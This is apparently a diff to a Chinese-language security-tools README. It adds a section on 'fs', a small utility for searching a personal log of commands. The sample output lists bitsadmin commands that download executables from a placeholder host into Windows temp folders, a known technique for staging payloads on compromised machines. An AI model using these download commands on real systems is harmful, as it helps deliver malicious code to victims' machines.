@@ -23,3 +23,29 @@
 ## WebFilter
 
 > Burpsuite代理的时候可以使用这部分过滤非常多的垃圾网站（包含一部分互联网企业，如果挖掘src的需要自行研判了）以此减轻BurpSuite被动扫描的压力。
+
+## Fs
+
+>  年龄大了？记忆不好？就用fs
+>
+> 代码很简洁，需要自己简单修改下代码，没有很好做好适配。
+>
+> 把你常用且又爱忘记的一些命令放到use.log里，然后通过执行Linux命令来检索。
+>
+> 那么你只需要编译好这个工具以后直接fs admin，就可以检索admin相关的信息出来。
+
+如下所示：
+
+```bash
+➜  ~ fs bitsadmin
+-+====================================+-
+   181  ➜  windows download[+]:bitsadmin /rawreturn /transfer getfile http://x.x.x.x:8888/tomcat.exe c:\\users\\Manager\\AppData\\Local\\Temp
+   183  ➜  windows download[+]:bitsadmin /rawreturn /transfer down "http://127.0.0.1:8080/z.exe" c:\\z.exe
+   259  ➜  bitsadmin /rawreturn /transfer getfile http://x.x.x.x/tomcat.exe c:\\users\\Manager\\AppData\\Local\\Temp
+-+====================================+-
+```
+
+安排的明明白白。
+
+懒人必备神器！
+
